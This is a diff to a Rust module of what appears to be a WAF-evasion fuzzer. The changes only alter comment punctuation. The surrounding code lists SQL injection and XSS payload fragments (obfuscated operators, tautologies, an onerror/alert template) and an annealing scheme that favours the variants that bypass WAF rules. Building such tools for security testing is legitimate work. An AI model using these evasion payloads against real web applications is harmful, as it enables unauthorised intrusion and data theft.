@@ -12,7 +12,7 @@
 //! fingerprints with known attacks. Convergence-guided mutation spends
 //! early budget exploring the full production space, then cools so later
 //! samples concentrate probability mass on the productions least likely to
-//! trigger WAF rules — closing the feedback loop between oracle outcomes and
+//! trigger WAF rules, closing the feedback loop between oracle outcomes and
 //! production-rule selection probabilities.
 //!
 //! # Architecture
@@ -59,10 +59,10 @@ pub struct Production {
     pub terminal: String,
     /// Human-readable label. Read by [`CfgMutator::reward_by_name`] for
     /// name-keyed oracle feedback. Wired via [`CfgMutatorState::reward`]
-    /// and the public `feedback` function — no longer dead code as of
+    /// and the public `feedback` function, no longer dead code as of
     /// R56 pass-21.
     pub name: &'static str,
-    /// Bypass score — updated by the caller when this production's output
+    /// Bypass score, updated by the caller when this production's output
     /// evades the WAF. Higher = more likely to be selected as T cools.
     pub bypass_score: f64,
 }
@@ -83,42 +83,42 @@ impl Production {
 /// Build the default production set for SQL injection evasion.
 ///
 /// Non-terminals used:
-/// - `{ws}` — whitespace / comment separators
-/// - `{comment}` — trailing comment terminators
-/// - `{or}` — OR operator variants
-/// - `{and}` — AND operator variants
-/// - `{eq}` — equality operator variants
-/// - `{str_open}` — opening quote variants
-/// - `{tautology}` — tautological right-hand side
+/// - `{ws}`: whitespace / comment separators
+/// - `{comment}`: trailing comment terminators
+/// - `{or}`: OR operator variants
+/// - `{and}`: AND operator variants
+/// - `{eq}`: equality operator variants
+/// - `{str_open}`: opening quote variants
+/// - `{tautology}`: tautological right-hand side
 #[must_use]
 pub fn default_sql_productions() -> Vec<Production> {
     let mut prods = Vec::new();
 
-    // {ws} — whitespace alternatives
+    // {ws}, whitespace alternatives
     for &ws in &[
         " ", "\t", "\n", "/**/", "/**_*/", "/*!*/", "%20", "%09", "%0a", "%0d", "%a0",
     ] {
         prods.push(Production::new("{ws}", ws, "ws_variant"));
     }
 
-    // {comment} — trailing comment terminators
+    // {comment}, trailing comment terminators
     for &c in &["--", "-- ", "--+", "#", "/*", ";--", "-- -", ";#", "/*!*/"] {
         prods.push(Production::new("{comment}", c, "comment_terminator"));
     }
 
-    // {or} — OR operator variants
+    // {or}: OR operator variants
     for &op in &[
         "OR", "||", "or", "Or", "oR", "OR/**/", "/*!OR*/", "O/**/R", "OORR",
     ] {
         prods.push(Production::new("{or}", op, "or_operator"));
     }
 
-    // {and} — AND operator variants
+    // {and}: AND operator variants
     for &op in &["AND", "&&", "and", "And", "A/**/ND", "/*!AND*/", "AN/**/D"] {
         prods.push(Production::new("{and}", op, "and_operator"));
     }
 
-    // {eq} — equality variants
+    // {eq}, equality variants
     for &eq in &[
         "=",
         " = ",
@@ -131,12 +131,12 @@ pub fn default_sql_productions() -> Vec<Production> {
         prods.push(Production::new("{eq}", eq, "eq_operator"));
     }
 
-    // {str_open} — quote opening
+    // {str_open}, quote opening
     for &q in &["'", "\"", "`", "''", "\"\""] {
         prods.push(Production::new("{str_open}", q, "str_open"));
     }
 
-    // {tautology} — tautological conditions
+    // {tautology}, tautological conditions
     for &t in &[
         "1=1",
         "1 LIKE 1",
@@ -162,18 +162,18 @@ pub fn default_sql_productions() -> Vec<Production> {
 pub fn default_xss_productions() -> Vec<Production> {
     let mut prods = Vec::new();
 
-    // {tag_open} — opening tag variants.
+    // {tag_open} (opening tag variants).
     //
     // Only literal-`<` forms here. Percent-encoded (%3C), hex-escape (\x3c),
     // and entity forms (&#60; / &lt;) require the oracle's normalisation layer
-    // to be present before the payload is evaluated — they are not valid raw
+    // to be present before the payload is evaluated, they are not valid raw
     // grammar mutations and would fail `still_executes_xss` validation.
     // Evasion-encoded forms live in the equiv/xss pipeline instead.
     for &t in &["<", "\t<", " <", "\n<"] {
         prods.push(Production::new("{tag_open}", t, "tag_open"));
     }
 
-    // {event} — event handler variants
+    // {event}, event handler variants
     for &e in &[
         "onerror",
         "onload",
@@ -189,7 +189,7 @@ pub fn default_xss_productions() -> Vec<Production> {
         prods.push(Production::new("{event}", e, "event_handler"));
     }
 
-    // {exec} — execution functions
+    // {exec}, execution functions
     for &f in &[
         "alert(1)",
         "confirm(1)",
@@ -202,7 +202,7 @@ pub fn default_xss_productions() -> Vec<Production> {
         prods.push(Production::new("{exec}", f, "exec_function"));
     }
 
-    // {sep} — attribute separator before event
+    // {sep}, attribute separator before event
     for &s in &[" ", "\t", "\n", "/", "//", "\x0c", "\x0b"] {
         prods.push(Production::new("{sep}", s, "attr_sep"));
     }
@@ -258,7 +258,7 @@ pub fn boltzmann_sample<'a>(
     }
     if !total.is_finite() {
         // Overflow: exp(score/T) hit +Inf for at least one high-score
-        // candidate. Fall back to argmax — the highest-scoring production
+        // candidate. Fall back to argmax, the highest-scoring production
         // dominates, which is the correct cold-temperature behaviour.
         return candidates.into_iter().max_by(|a, b| {
             a.bypass_score
@@ -283,7 +283,7 @@ pub fn boltzmann_sample<'a>(
 ///
 /// Usage pattern:
 /// ```ignore
-/// // cfg_convergence is pub(crate) — call via grammar::mutate_as().
+/// // cfg_convergence is pub(crate) (call via grammar::mutate_as()).
 /// // This example is kept as documentation only.
 /// # use wafrift_grammar::grammar::cfg_convergence::{CfgMutator, default_sql_productions};
 /// let mut mutator = CfgMutator::builder()
@@ -420,7 +420,7 @@ impl CfgMutator {
                     nt.push(inner);
                 }
                 if !found_close {
-                    // Unclosed brace — emit literally.
+                    // Unclosed brace (emit literally).
                     result.push('{');
                     result.push_str(&nt);
                     continue;
@@ -431,7 +431,7 @@ impl CfgMutator {
                 {
                     result.push_str(&prod.terminal);
                 } else {
-                    // Unknown non-terminal — leave in place.
+                    // Unknown non-terminal (leave in place).
                     result.push_str(&nt_tag);
                 }
             } else {
@@ -453,7 +453,7 @@ impl CfgMutator {
     ///
     /// **Oracle feedback wiring**: called by [`CfgMutatorState::reward`] and
     /// (indirectly) by `feedback` in `grammar/mod.rs`. Both functions are
-    /// part of the `mutate_as_with_state` API surface — R56 pass-21
+    /// part of the `mutate_as_with_state` API surface. R56 pass-21
     /// closes the oracle feedback loop (§9 WIRING / §11 UTILIZATION).
     pub fn reward(&mut self, nonterminal: &str, terminal: &str, delta: f64) {
         for p in &mut self.productions {
@@ -471,7 +471,7 @@ impl CfgMutator {
     /// `delta` semantics are identical to `reward`.
     ///
     /// Called by [`CfgMutatorState::reward`] which is invoked by the
-    /// public `feedback` function — no longer dead code as of R56 pass-21.
+    /// public `feedback` function (no longer dead code as of R56 pass-21).
     pub fn reward_by_name(&mut self, name: &str, delta: f64) {
         for p in &mut self.productions {
             if p.name == name {
@@ -499,7 +499,7 @@ impl CfgMutator {
     /// Whether the annealing schedule has converged (T ≤ T_min + ε).
     ///
     /// Once converged, all expansions will deterministically choose the
-    /// highest-bypass-score production for each non-terminal — additional
+    /// highest-bypass-score production for each non-terminal, additional
     /// `anneal()` calls have no effect on selection behaviour. Callers
     /// can use this to avoid redundant samples after convergence.
     #[must_use]
@@ -509,7 +509,7 @@ impl CfgMutator {
 
     /// List all registered non-terminals.
     ///
-    /// §1 SPEED: pre-fix used `Vec::contains` for deduplication — O(n²) with
+    /// §1 SPEED: pre-fix used `Vec::contains` for deduplication. O(n²) with
     /// n = production count (up to ~70 for the default SQL grammar).  With ~60
     /// productions and 7 non-terminals the old path did ≤60×60 = 3 600 pointer
     /// comparisons per call; this was called once per `expand()` in debug builds
@@ -623,7 +623,7 @@ pub const SQL_TEMPLATES: &[&str] = &[
 /// Standard XSS templates.
 ///
 /// `img` uses `src=x` so the `onerror` event fires when the bogus source
-/// fails to load — without `src`, browsers may not dispatch the event.
+/// fails to load (without `src`, browsers may not dispatch the event).
 pub const XSS_TEMPLATES: &[&str] = &[
     "{tag_open}img src=x{sep}{event}={exec}>",
     "{tag_open}svg{sep}{event}={exec}>",
@@ -678,7 +678,7 @@ mod tests {
     #[test]
     fn expand_unclosed_brace_emits_literally() {
         let mut m = make_mutator();
-        // No closing brace — should emit "{ws" literally.
+        // No closing brace (should emit "{ws" literally).
         let result = m.expand("{ws");
         assert!(
             result.starts_with('{'),
